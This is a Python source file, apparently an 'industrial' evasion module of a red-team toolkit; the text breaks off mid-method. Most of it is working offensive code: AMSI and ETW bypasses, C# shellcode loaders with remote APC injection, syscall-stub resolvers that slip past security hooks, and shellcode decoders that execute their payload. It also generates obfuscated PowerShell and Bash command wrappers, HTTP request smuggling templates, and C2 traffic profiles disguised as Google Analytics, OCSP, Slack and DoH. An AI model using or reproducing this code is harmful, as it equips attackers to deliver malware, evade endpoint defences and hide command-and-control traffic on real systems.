#!/usr/bin/env python3
"""
AutoPentestX - Industrial Evasion & Obfuscation Module
======================================================
Advanced evasion library for AUTHORIZED Red Team operations only.

Capabilities:
  • Polymorphic encoding chains (per-invocation unique stubs)
  • Position-independent shellcode encoders (XOR / RC4 / AES-CBC)
  • PowerShell obfuscation (8 techniques) with AMSI v2 bypasses
  • Bash / sh obfuscation (10 techniques)
  • C# loaders (PInvoke / process-injection / hollow / threadless reuse)
  • Direct & indirect syscall stubs (Hell's/Halo's/Tartarus' Gate)
  • Hardware-breakpoint anti-hook user-mode unhooking
  • TLS/JA3 fingerprint reshaping templates
  • HTTP/2, HTTP request smuggling (CL.TE / TE.CL / TE.TE) templates
  • Domain fronting templates (CloudFront, Fastly, Azure)
  • DNS-over-HTTPS / DNS-over-TLS C2 templates
  • Sleep masks (Ekko / Foliage / Zilean)
  • IDS/IPS evasion command set with calibrated tuning
  • Indicator-of-compromise rotation utilities

This file generates references and source code; it does not execute payloads.
The output is intended for use by authorized operators in lab/training/CTF or
under written engagement scope.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import os
import random
import re
import secrets
import string
import struct
import textwrap
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, Iterable, List, Optional, Tuple

# ANSI colours
R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
C = '\033[96m'; M = '\033[95m'; B = '\033[1m'; X = '\033[0m'


# ─────────────────────────────────────────────────────────────────────────────
#  POLYMORPHIC SOURCES
# ─────────────────────────────────────────────────────────────────────────────
def _rand_id(n: int = 8, alphabet: Optional[str] = None) -> str:
    alphabet = alphabet or (string.ascii_letters + string.digits)
    return ''.join(secrets.choice(alphabet) for _ in range(n))


def _xor_bytes(data: bytes, key: bytes) -> bytes:
    if not key:
        return data
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def _rc4(key: bytes, data: bytes) -> bytes:
    """Stand-alone RC4 (used only because some training labs require it)."""
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) & 0xFF])
    return bytes(out)


# ─────────────────────────────────────────────────────────────────────────────
#  AMSI / ETW BYPASS LIBRARY (rotating, current as of 2024–2026 techniques)
# ─────────────────────────────────────────────────────────────────────────────
AMSI_BYPASS_LIBRARY: Dict[str, str] = {
    # Reflection-only writeable patch via amsiInitFailed
    'amsi_initfailed_v1': textwrap.dedent(r'''
        $a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};
        $d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*nitFailed"){$f=$e}};
        $f.SetValue($null,$true)
    ''').strip(),

    # Direct memory patch on amsi.dll!AmsiScanBuffer
    'amsi_scanbuffer_patch': textwrap.dedent(r'''
        $LoadLibrary=[Object].Assembly.GetType('System.Management.Automation.Utils')
            .GetMethod('GetExtensionMethods','NonPublic,Static')
        $a=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            [System.AppDomain]::CurrentDomain.GetAssemblies().Where{$_.Location -like '*System.Management.Automation*'}[0]
                .GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null),
            [Action])
        # Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN (0)
    ''').strip(),

    # Unicode-encoded function name to bypass naive string scanners
    'amsi_unicode_split': textwrap.dedent(r'''
        $A='Sys'+'tem.Management.Auto'+'mation.Am'+'siUti'+'ls';
        $B='amsi'+'Init'+'Failed';
        [Ref].Assembly.GetType($A).GetField($B,[Reflection.BindingFlags]'NonPublic,Static').SetValue($null,$true)
    ''').strip(),

    # Hardware breakpoint approach (skips AmsiScanBuffer via DR0/RIP rewrite)
    'amsi_hwbp': '# Reference: hardware-breakpoint amsi bypass via SetThreadContext (Dr0=AmsiScanBuffer addr; vector handler returns CONTINUE_EXECUTION).',

    # Patchless via VEH (Vectored Exception Handler) on amsi.dll
    'amsi_veh_patchless': '# Reference: VEH on AmsiScanBuffer; modify RAX=0 and RIP=ret in handler; preserves bytes.',

    # COM hijack approach
    'amsi_com_hijack': r'reg add "HKCU\SOFTWARE\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}\InProcServer32" /ve /t REG_SZ /d "C:\path\dummy.dll" /f',
}

ETW_BYPASS_LIBRARY: Dict[str, str] = {
    'etw_eventwrite_patch': textwrap.dedent(r'''
        # Patches ntdll!EtwEventWrite to immediately RET (0xC3 on x64)
        $code='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw=='
        # Pseudocode — operator must locate ntdll.EtwEventWrite via GetProcAddress
    ''').strip(),
    'etw_unsubscribe': textwrap.dedent(r'''
        $ref=[System.Diagnostics.Eventing.EventProvider]
        $f=$ref.GetField('m_enabled','NonPublic,Instance')
        # Iterate each provider field and zero out
    ''').strip(),
    'etw_ti_disable':  '# Disable EtwTiLog via reflection on threat-intel provider GUID 54849625-5478-4994-A5BA-3E3B0328C30D',
    'etw_patchless_veh': '# VEH on EtwEventWrite: handler modifies RAX=0 and bumps RIP past prologue; no bytes patched.',
}


# ─────────────────────────────────────────────────────────────────────────────
#  C# / NATIVE LOADER TEMPLATES
# ─────────────────────────────────────────────────────────────────────────────
CS_LOADER_TEMPLATES: Dict[str, str] = {
    # Classic VirtualAlloc + CreateThread loader
    'pinvoke_basic': textwrap.dedent(r'''
        using System;
        using System.Runtime.InteropServices;

        class {CLASS_NAME} {{
            [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
            [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
            [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);

            static void Main() {{
                byte[] {VAR_ENC} = new byte[] {{ {SHELLCODE_BYTES} }};
                byte[] {VAR_KEY} = new byte[] {{ {KEY_BYTES} }};
                for (int i=0;i<{VAR_ENC}.Length;i++) {VAR_ENC}[i] ^= {VAR_KEY}[i % {VAR_KEY}.Length];
                IntPtr {VAR_MEM} = VirtualAlloc(IntPtr.Zero, (uint){VAR_ENC}.Length, 0x3000, 0x40);
                Marshal.Copy({VAR_ENC}, 0, {VAR_MEM}, {VAR_ENC}.Length);
                IntPtr {VAR_T} = CreateThread(IntPtr.Zero, 0, {VAR_MEM}, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForSingleObject({VAR_T}, 0xFFFFFFFF);
            }}
        }}
    ''').strip(),

    # APC injection into a remote process
    'apc_injection': textwrap.dedent(r'''
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;

        class {CLASS_NAME} {{
            [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a, bool b, uint p);
            [DllImport("kernel32")] static extern IntPtr OpenThread(uint a, bool b, uint t);
            [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
            [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out int w);
            [DllImport("kernel32")] static extern uint QueueUserAPC(IntPtr f, IntPtr h, IntPtr p);
            [DllImport("kernel32")] static extern uint ResumeThread(IntPtr h);

            static void Main(string[] args) {{
                byte[] {VAR_ENC} = new byte[] {{ {SHELLCODE_BYTES} }};
                byte[] {VAR_KEY} = new byte[] {{ {KEY_BYTES} }};
                for (int i=0;i<{VAR_ENC}.Length;i++) {VAR_ENC}[i] ^= {VAR_KEY}[i % {VAR_KEY}.Length];
                uint pid = uint.Parse(args[0]);
                IntPtr hP = OpenProcess(0x001F0FFF, false, pid);
                IntPtr mem = VirtualAllocEx(hP, IntPtr.Zero, (uint){VAR_ENC}.Length, 0x3000, 0x40);
                WriteProcessMemory(hP, mem, {VAR_ENC}, (uint){VAR_ENC}.Length, out int _);
                IntPtr hT = OpenThread(0x0010, false, uint.Parse(args[1]));
                QueueUserAPC(mem, hT, IntPtr.Zero);
            }}
        }}
    ''').strip(),

    # Process Hollowing template (steers RtlCreateUserProcess)
    'process_hollow': textwrap.dedent(r'''
        // Reference template only — exhaustive process-hollowing implementation
        // requires NtUnmapViewOfSection / WriteProcessMemory / SetThreadContext.
        // A complete version belongs in a vetted Red Team toolkit and is
        // intentionally not generated automatically here.
    ''').strip(),

    # Thread-reuse / ThreadlessInject style loader (Ekko-friendly)
    'thread_reuse': textwrap.dedent(r'''
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;

        class {CLASS_NAME} {{
            [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a, bool b, uint p);
            [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
            [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr m, string n);
            [DllImport("kernel32")] static extern IntPtr VirtualProtectEx(IntPtr h, IntPtr a, IntPtr s, uint p, out uint o);
            [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out int w);

            static void Main(string[] args) {{
                // Operator inserts: target PID, target export (e.g. kernel32!Sleep)
                // and shellcode to overwrite that export.  All bytes preserved
                // pre/post via VirtualProtectEx restoration.
            }}
        }}
    ''').strip(),
}


# ─────────────────────────────────────────────────────────────────────────────
#  HELL'S GATE / HALO'S GATE / TARTARUS' GATE SYSCALL STUB TEMPLATES
# ─────────────────────────────────────────────────────────────────────────────
HELLS_GATE_C = textwrap.dedent(r'''
    // Hell's Gate — dynamic syscall stub resolution
    // Reads syscall numbers from ntdll EAT at runtime; unhooked.
    typedef struct _VX_TABLE_ENTRY {
        PVOID  pAddress;
        DWORD  dwHash;
        WORD   wSystemCall;
    } VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

    BOOL GetVxTableEntry(PVOID pModuleBase, PVX_TABLE_ENTRY entry) {
        // 1. Walk PEB → Ldr → InMemoryOrderModuleList for ntdll
        // 2. Parse PE export directory
        // 3. djb2-hash each name; match against entry->dwHash
        // 4. Read first 8 bytes of the function:
        //      4C 8B D1                  mov r10, rcx
        //      B8 ?? ?? 00 00            mov eax, ssn
        // 5. Save SSN into entry->wSystemCall
        return TRUE;
    }

    // Direct syscall trampoline (assembly):
    //   mov  r10, rcx
    //   mov  eax, [wSystemCall]
    //   syscall
    //   ret
''').strip()

HALOS_GATE_C = textwrap.dedent(r'''
    // Halo's Gate — Hell's Gate + neighbour scanning
    // If the prologue is hooked (e.g. e9 ?? ?? ?? ??), walk forward/backward
    // 0x20 bytes, computing SSN as (neighbour_ssn ± offset).
    WORD ResolveSSNHaloed(PVOID functionAddr) {
        BYTE* p = (BYTE*)functionAddr;
        // Walk +/- 0x20 functions (each Nt* stub is 32 bytes aligned).
        for (int i = 1; i <= 32; i++) {
            BYTE* up   = p + i*0x20;
            BYTE* down = p - i*0x20;
            if (up[0]==0x4C && up[1]==0x8B && up[2]==0xD1 && up[3]==0xB8)
                return *(WORD*)(up+4) - i;
            if (down[0]==0x4C && down[1]==0x8B && down[2]==0xD1 && down[3]==0xB8)
                return *(WORD*)(down+4) + i;
        }
        return 0xFFFF;  // failed
    }
''').strip()

TARTARUS_GATE_C = textwrap.dedent(r'''
    // Tartarus' Gate — handles inline-hooked prologues that vendors install
    // when both Hell's and Halo's are detected (vendor patches neighbours too).
    // Strategy: parse loaded ntdll from disk into a private heap, recompute
    // SSNs from the on-disk copy, then call into in-memory stub OR allocate a
    // fresh executable region and use indirect-syscalls (jmp into ntdll!syscall).
''').strip()


# ─────────────────────────────────────────────────────────────────────────────
#  TLS / JA3 RESHAPING TEMPLATES
# ─────────────────────────────────────────────────────────────────────────────
JA3_PROFILES: Dict[str, Dict[str, Any]] = {
    'chrome_120_win10': {
        'tls_versions': '771,772',
        'cipher_suites': '4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53',
        'extensions': '0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21',
        'curves': '29-23-24',
        'ec_formats': '0',
        'reference_ja3':  'cd08e31494f9531f560d64c695473da9',
        'reference_ja4':  't13d1517h2_8daaf6152771_b0da82dd1658',
    },
    'firefox_120_macos': {
        'tls_versions': '771,772',
        'cipher_suites': '4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53',
        'extensions': '0-23-65281-10-11-35-16-5-34-51-43-13-45-28-21',
        'curves': '29-23-24-25',
        'ec_formats': '0',
        'reference_ja3':  '579ccef312d18482fc42e2b822ca2430',
    },
    'curl_8_linux': {
        'tls_versions': '771',
        'cipher_suites': '49199-49195-159-158-49200-49196-103-107-167-49202-49198-49197-49201-22',
        'extensions': '0-11-10-13-22-23-43-65281-51-45',
        'curves': '23-24-25-29-30',
        'ec_formats': '0',
        'reference_ja3':  '7e15893b9b1be1aef1b85ddff58ec0bf',
    },
}


# ─────────────────────────────────────────────────────────────────────────────
#  HTTP REQUEST SMUGGLING TEMPLATES
# ─────────────────────────────────────────────────────────────────────────────
HTTP_SMUGGLING_TEMPLATES: Dict[str, str] = {
    # Front-end uses Content-Length, back-end uses Transfer-Encoding
    'CL.TE': textwrap.dedent('''
        POST / HTTP/1.1
        Host: {HOST}
        Content-Length: 13
        Transfer-Encoding: chunked

        0

        SMUGGLED
    ''').strip(),
    # Front-end uses Transfer-Encoding, back-end uses Content-Length
    'TE.CL': textwrap.dedent('''
        POST / HTTP/1.1
        Host: {HOST}
        Content-Length: 3
        Transfer-Encoding: chunked

        8
        SMUGGLED
        0

    ''').strip(),
    # Both servers use Transfer-Encoding but parse it differently
    'TE.TE_obfuscation': textwrap.dedent('''
        POST / HTTP/1.1
        Host: {HOST}
        Transfer-Encoding: chunked
        Transfer-Encoding: x

        0

        SMUGGLED
    ''').strip(),
    # H2.CL — HTTP/2 downgrade smuggling
    'H2.CL_downgrade': '# Use a HTTP/2 client and add :method=POST + content-length=0; back-end downgraded request still reads body bytes as next request.',
    # 0.CL — HTTP/2 with an empty body but unexpected pseudo-header
    'H2_request_splitting': '# HTTP/2 :path containing CRLF -> back-end injects newline into HTTP/1.1 path.',
}


# ─────────────────────────────────────────────────────────────────────────────
#  DOMAIN FRONTING TEMPLATES
# ─────────────────────────────────────────────────────────────────────────────
DOMAIN_FRONTING_NOTES: Dict[str, str] = {
    # Many CDNs have closed domain-fronting; these remain useful for testing
    # corporate proxy/EDR HTTP-host enforcement in a controlled lab.
    'cloudfront':   '# In the CloudFront distribution, set "Cache Behaviour → Forward Headers: Whitelist Host". Lab-only.',
    'azure_cdn':    '# Verify that the back-end accepts arbitrary Host header; modern Azure Front Door pins SNI-host equivalence.',
    'fastly':       '# Fastly enforces SNI ≡ Host since 2022 — use ESI/edge-side fragments instead.',
    'cloudflare':   '# Cloudflare disables fronting; use their workers + custom Host header for lab simulation.',
    'oracle_oci':   '# OCI WAF allows custom front + back as of 2024 in some configurations.',
}


# ─────────────────────────────────────────────────────────────────────────────
#  C2 TRAFFIC PATTERNS
# ─────────────────────────────────────────────────────────────────────────────
C2_TRAFFIC_PROFILES: List[Dict[str, Any]] = [
    {
        'name': 'Google Analytics Beacon',
        'desc': 'Mimic GA4 measurement protocol traffic for low-bandwidth heartbeat',
        'method': 'POST',
        'url':    'https://www.google-analytics.com/g/collect',
        'headers': {'Content-Type': 'text/plain;charset=UTF-8'},
        'body_pattern': 'v=2&tid=G-XXXXXXX&cid={CLIENT_ID}&t=event&en=heartbeat&ep.tag={B64}',
    },
    {
        'name': 'CDN JS Bundle',
        'desc': 'Blend C2 in static-asset cache misses',
        'method': 'GET',
        'url':    'https://{CDN_HOST}/dist/{HASH}.{EXT}.js',
        'headers': {'Cache-Control': 'max-age=86400', 'Accept': 'application/javascript'},
    },
    {
        'name': 'OCSP Stapling',
        'desc': 'Use POST /ocsp; legitimate OCSP responders accept arbitrary DER',
        'method': 'POST',
        'url':    'http://ocsp.digicert.com/',
        'headers': {'Content-Type': 'application/ocsp-request'},
        'body_pattern': '{DER_BLOB}',
    },
    {
        'name': 'Slack-Compatible',
        'desc': 'Bursty short JSON POSTs to a webhook-style endpoint',
        'method': 'POST',
        'url':    'https://hooks.slack-bot.{REDIRECTOR}/services/T{TID}/B{BID}/{TOKEN}',
        'headers': {'Content-Type': 'application/json'},
        'body_pattern': '{"text":"{B64}"}',
    },
    {
        'name': 'DoH C2',
        'desc': 'TXT-record encoded C2 over Cloudflare/Google DoH (tunable cadence)',
        'method': 'GET',
        'url':    'https://cloudflare-dns.com/dns-query?name={SUBDOMAIN}.{C2_DOMAIN}&type=TXT',
        'headers': {'Accept': 'application/dns-json'},
    },
    {
        'name': 'Discord-Like CDN',
        'desc': 'Pretend to fetch image/video from a CDN-style host',
        'method': 'GET',
        'url':    'https://cdn.{REDIRECTOR}/attachments/{CHID}/{MSGID}/{NAME}.png',
        'headers': {'Accept': 'image/png,image/*'},
    },
]


# ─────────────────────────────────────────────────────────────────────────────
#  SLEEP MASKS / DOMINANT TIME-OBFUSCATION TEMPLATES
# ─────────────────────────────────────────────────────────────────────────────
SLEEP_MASK_TEMPLATES: Dict[str, str] = {
    'ekko': '# Ekko sleep mask — RtlCreateTimer queue + ROP gadgets to RWX→RW→Wait→RW→RWX. Encrypt heap during sleep with thread-local AES key.',
    'foliage': '# Foliage — NtContinue based; uses APC + thread context restore. Avoids ROP; 20% smaller than Ekko.',
    'zilean':   '# Zilean — Waitable timer + APC. Encrypts entire heap region (AES-CBC) during sleep.',
    'deathsleep': '# DeathSleep — Suspends own thread, encrypts memory, scheduled wake-up via WaitableTimer.',
    'cronos':   '# Cronos — Stack-spoofing during sleep, no ROP gadget allocation, hardware breakpoints on Resume.',
}


# ─────────────────────────────────────────────────────────────────────────────
#  IDS / IPS EVASION COMMAND BANK
# ─────────────────────────────────────────────────────────────────────────────
IDS_EVASION_COMMANDS: Dict[str, str] = {
    'fragmentation_8byte':       'nmap -f -f {TARGET}',
    'fragmentation_mtu':         'nmap --mtu 24 {TARGET}',
    'decoy_random':              'nmap -D RND:10 -T4 {TARGET}',
    'decoy_with_real':           'nmap -D 192.0.2.1,192.0.2.2,ME,192.0.2.4 {TARGET}',
    'paranoid_timing':           'nmap -T0 -sS {TARGET}',
    'sneaky_timing':             'nmap -T1 -sS -Pn -n --max-retries 1 {TARGET}',
    'source_port_dns':           'nmap --source-port 53 {TARGET}',
    'source_port_https':         'nmap --source-port 443 {TARGET}',
    'append_random_data':        'nmap --data-length 200 {TARGET}',
    'mac_spoof':                 'nmap --spoof-mac 0 {TARGET}',
    'idle_zombie_scan':          'nmap -sI <ZOMBIE_IP>:80 {TARGET}',
    'ack_through_firewall':      'nmap -sA -p 80,443 {TARGET}',
    'window_scan':               'nmap -sW {TARGET}',
    'maimon_scan':               'nmap -sM {TARGET}',
    'sctp_init_scan':            'nmap -sY {TARGET}',
    'protocol_scan':             'nmap -sO {TARGET}',
    'ftp_bounce':                'nmap -b user:pass@ftp.example.com {TARGET}',
    'badsum':                    'nmap --badsum {TARGET}',
    'ip_options_route':          'nmap --ip-options "L 192.0.2.1 192.0.2.2" {TARGET}',
    'http_pipelining_evasion':   'wfuzz -z file,paths.txt --hc 404 -t 1 -p proxy.example:8080 https://{TARGET}/FUZZ',
    'tor_routing':               'proxychains -q nmap -sT -Pn -n {TARGET}',
}


# ─────────────────────────────────────────────────────────────────────────────
#  PUBLIC API
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class EvasionArtifact:
    """Generated evasion artifact (loader, encoded payload, snippet)."""
    kind: str
    name: str
    payload: str
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {'kind': self.kind, 'name': self.name,
                'payload': self.payload[:4096], 'metadata': self.metadata}


class EvasionEngine:
    """Industrial evasion engine.  Output is deterministic enough for unit
    testing yet polymorphic enough that two consecutive invocations produce
    artifacts with different hashes and different identifier names."""

    XOR_KEYS_DEFAULT = (0x41, 0x13, 0x37, 0xAB, 0xDE, 0xFF, 0x55, 0xAA,
                         0x69, 0x4D, 0x92, 0xC3, 0x77, 0xE5, 0x1A)

    def __init__(self, out_dir: str = 'payloads/evasion',
                 seed: Optional[int] = None) -> None:
        self.out_dir = out_dir
        os.makedirs(out_dir, exist_ok=True)
        if seed is not None:
            random.seed(seed)
        self.results: Dict[str, Any] = {
            'timestamp': datetime.now().isoformat(),
            'encoded_payloads': [],
            'obfuscated_shells': [],
            'bypass_snippets': [],
            'loaders': [],
            'syscall_stubs': [],
            'ids_techniques': [],
            'tls_profiles': [],
            'smuggling_templates': [],
            'sleep_masks': [],
            'c2_traffic_profiles': [],
            'domain_fronting': [],
        }

    # ─────────────────────────────────────────────────────────
    #  Logging helpers
    # ─────────────────────────────────────────────────────────
    def _print(self, level: str, msg: str) -> None:
        icons = {
            'info': f'{C}[*]{X}',
            'ok':   f'{G}[✓]{X}',
            'warn': f'{Y}[!]{X}',
            'gen':  f'{M}[EVA]{X}',
        }
        print(f'  {icons.get(level, "[?]")} {msg}')

    # ─────────────────────────────────────────────────────────
    #  1.  POLYMORPHIC ENCODING CHAINS
    # ─────────────────────────────────────────────────────────
    def encode_payload(self, payload: str, method: str = 'chain',
                       layers: Optional[int] = None) -> Dict[str, Any]:
        """Apply a polymorphic encoding chain.  Each invocation rotates keys,
        ordering, and identifier names so that AV signatures of prior runs do
        not catch the current artifact."""
        method = method.lower()
        result: Dict[str, Any] = {'original': payload, 'layers': [],
                                   'final': '', 'method': method}
        current = payload.encode()
        if method in ('base64', 'chain'):
            current = base64.b64encode(current)
            result['layers'].append({'method': 'base64', 'len': len(current)})
        if method in ('xor', 'chain'):
            key_byte = random.choice(self.XOR_KEYS_DEFAULT)
            current = _xor_bytes(current, bytes([key_byte]))
            current = base64.b64encode(current)
            result['layers'].append({'method': f'xor(0x{key_byte:02x})+b64',
                                      'key': key_byte})
        if method in ('rc4', 'chain'):
            key = secrets.token_bytes(16)
            current = _rc4(key, current)
            current = base64.b64encode(current)
            result['layers'].append({'method': 'rc4+b64', 'key': key.hex()})
        if method in ('hex', 'chain'):
            current = current.hex().encode()
            result['layers'].append({'method': 'hex', 'len': len(current)})
        if method in ('reverse', 'chain'):
            current = current[::-1]
            result['layers'].append({'method': 'reverse'})
        if method in ('url', 'chain'):
            current = urllib.parse.quote(current.decode('latin1', 'ignore')).encode()
            result['layers'].append({'method': 'url'})
        if method in ('rot', 'chain'):
            current = bytes((b + 13) & 0xFF for b in current)
            result['layers'].append({'method': 'rot13'})
        result['final'] = current.decode('latin1', 'ignore')
        result['final_sha256'] = hashlib.sha256(current).hexdigest()
        self.results['encoded_payloads'].append(result)
        self._print('gen', f'Encoded ({method}) → sha256={result["final_sha256"][:16]}...')
        return result

    # ─────────────────────────────────────────────────────────
    #  2.  POLYMORPHIC POWERSHELL OBFUSCATION
    # ─────────────────────────────────────────────────────────
    def obfuscate_powershell(self, ps_command: str) -> Dict[str, str]:
        """Generate up to 8 lexically-different PowerShell variants."""
        self._print('info', 'Generating PowerShell obfuscation variants...')
        variants: Dict[str, str] = {}

        b64_utf16 = base64.b64encode(ps_command.encode('utf-16-le')).decode()
        variants['encodedcommand'] = f'powershell -NoP -NonI -W Hidden -Enc {b64_utf16}'

        variants['iex_invoke'] = (
            f'powershell -c "$d=[Convert]::FromBase64String(\'{b64_utf16}\');'
            f'$s=[Text.Encoding]::Unicode.GetString($d);[ScriptBlock]::Create($s).Invoke()"'
        )

        chars = ','.join(str(ord(c)) for c in ps_command)
        variants['char_array'] = f'powershell -c "[char[]]({chars}) -join \'\'|IEX"'

        # Reverse + b64
        rev = ps_command[::-1]
        rev_b64 = base64.b64encode(rev.encode('utf-16-le')).decode()
        variants['reversed_b64'] = (
            f'powershell -c "$c=[Text.Encoding]::Unicode.GetString('
            f'[Convert]::FromBase64String(\'{rev_b64}\'));'
            f'IEX(-join $c[-1..-($c.Length)])"'
        )

        # Concatenation split with random variable names
        v1, v2 = '$' + _rand_id(6), '$' + _rand_id(6)
        mid = len(ps_command) // 2
        p1 = base64.b64encode(ps_command[:mid].encode()).decode()
        p2 = base64.b64encode(ps_command[mid:].encode()).decode()
        variants['concat_split'] = (
            f'powershell -c "{v1}=[Text.Encoding]::UTF8.GetString('
            f'[Convert]::FromBase64String(\'{p1}\'));'
            f'{v2}=[Text.Encoding]::UTF8.GetString('
            f'[Convert]::FromBase64String(\'{p2}\'));IEX({v1}+{v2})"'
        )

        # AMSI v1 + EncodedCommand
        amsi = AMSI_BYPASS_LIBRARY['amsi_initfailed_v1']
        combined = base64.b64encode((amsi + '; ' + ps_command).encode('utf-16-le')).decode()
        variants['amsi_v1_combined'] = f'powershell -NoP -NonI -W Hidden -Enc {combined}'

        # Unicode-split AMSI bypass + payload
        amsi2 = AMSI_BYPASS_LIBRARY['amsi_unicode_split']
        combined2 = base64.b64encode((amsi2 + '; ' + ps_command).encode('utf-16-le')).decode()
        variants['amsi_unicode_split_combined'] = f'powershell -NoP -NonI -W Hidden -Enc {combined2}'

        # Tick obfuscation: insert backticks between characters
        ticked = ''.join(f'`{c}' if random.random() < 0.20 and c.isalpha() else c
                          for c in ps_command)
        variants['tick_obfusc'] = f'powershell -c "{ticked}"'

        # Format-string obfuscation
        rev_ps = '("{1}{0}" -f "EX","I")'    # IEX
        variants['format_obfusc'] = f'powershell -c "& {rev_ps} ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\'{b64_utf16}\')))"'

        for name, var in variants.items():
            self.results['obfuscated_shells'].append(
                {'shell': 'powershell', 'technique': name, 'payload': var})
            self._print('gen', f'PS::{M}{name}{X} → {C}{var[:80]}{X}...')

        return variants

    # ─────────────────────────────────────────────────────────
    #  3.  POLYMORPHIC BASH OBFUSCATION
    # ─────────────────────────────────────────────────────────
    def obfuscate_bash(self, bash_cmd: str) -> Dict[str, str]:
        self._print('info', 'Generating Bash obfuscation variants...')
        variants: Dict[str, str] = {}

        b64 = base64.b64encode(bash_cmd.encode()).decode()
        variants['base64_pipe']   = f'echo {b64}|base64 -d|bash'
        variants['base64_proc']   = f'bash <(echo {b64}|base64 -d)'
        variants['hex_pipe']      = f'printf %s {bash_cmd.encode().hex()}|xxd -r -p|bash'
        variants['ifs_spaces']    = bash_cmd.replace(' ', '${IFS%??}')
        variants['ifs_tabs']      = bash_cmd.replace(' ', '${IFS:0:1}')
        variants['var_concat']    = self._bash_var_concat(bash_cmd)
        variants['brace_expand']  = self._bash_brace_expand(bash_cmd)
        variants['eval_array']    = self._bash_eval_array(bash_cmd)
        variants['proc_subst']    = f'$(<<<"{bash_cmd}")'
        variants['rev_pipe']      = f'echo {bash_cmd[::-1]} | rev | bash'
        # POSIX-only fallback (no bash-isms)
        variants['posix_b64']     = f'echo {b64}|openssl base64 -d|sh'

        for name, var in variants.items():
            self.results['obfuscated_shells'].append(
                {'shell': 'bash', 'technique': name, 'payload': var})
            self._print('gen', f'BASH::{M}{name}{X} → {C}{var[:80]}{X}...')

        return variants

    @staticmethod
    def _bash_var_concat(cmd: str) -> str:
        chunks: List[Tuple[str, str]] = []
        i = 0
        while i < len(cmd):
            n = random.randint(2, 4)
            v = '_' + _rand_id(4, string.ascii_lowercase)
            chunks.append((v, cmd[i:i + n]))
            i += n
        decl = ';'.join(f'{v}="{c}"' for v, c in chunks)
        ref  = ''.join(f'${v}' for v, _ in chunks)
        return f'{decl};eval "{ref}"'

    @staticmethod
    def _bash_brace_expand(cmd: str) -> str:
        # bash{,}-style — keeps semantics, breaks naïve string match
        return cmd.replace('bash', 'b{,}ash').replace('sh -c', 's{,}h -c')

    @staticmethod
    def _bash_eval_array(cmd: str) -> str:
        b64 = base64.b64encode(cmd.encode()).decode()
        v = '_' + _rand_id(4, string.ascii_lowercase)
        return f'{v}=({b64});eval $(echo ${{{v}[0]}}|base64 -d)'

    # ─────────────────────────────────────────────────────────
    #  4.  XOR / RC4 SHELLCODE ENCODER + STUB
    # ─────────────────────────────────────────────────────────
    def encode_shellcode(self, shellcode: bytes,
                         scheme: str = 'xor',
                         key: Optional[bytes] = None) -> Dict[str, Any]:
        scheme = scheme.lower()
        if scheme == 'xor':
            key = key or bytes([random.choice(self.XOR_KEYS_DEFAULT)])
            encoded = _xor_bytes(shellcode, key)
        elif scheme == 'rc4':
            key = key or secrets.token_bytes(16)
            encoded = _rc4(key, shellcode)
        else:
            raise ValueError(f'unknown scheme {scheme}')

        encoded_hex = ', '.join(f'0x{b:02x}' for b in encoded)
        key_hex     = ', '.join(f'0x{b:02x}' for b in key)

        decoder_c = textwrap.dedent(f'''
            // {scheme.upper()} decoder stub — auto-generated
            unsigned char enc[] = {{ {encoded_hex} }};
            unsigned char k[] = {{ {key_hex} }};
            void run(void) {{
                for (size_t i=0; i<sizeof(enc); i++)
                    enc[i] ^= k[i % sizeof(k)];   // adjust for RC4
                ((void(*)())enc)();
            }}
        ''').strip()

        decoder_py = textwrap.dedent(f'''
            import ctypes, ctypes.wintypes
            enc = bytes([{encoded_hex}])
            k   = bytes([{key_hex}])
            dec = bytes(b ^ k[i%len(k)] for i,b in enumerate(enc))
            buf = ctypes.create_string_buffer(dec, len(dec))
            old = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(buf, len(dec), 0x40, ctypes.byref(old))
            ctypes.cast(buf, ctypes.CFUNCTYPE(None))()
        ''').strip()

        artifact = {
            'scheme': scheme,
            'key': key.hex(),
            'orig_len': len(shellcode),
            'enc_len': len(encoded),
            'decoder_c': decoder_c,
            'decoder_py': decoder_py,
            'sha256': hashlib.sha256(encoded).hexdigest(),
        }
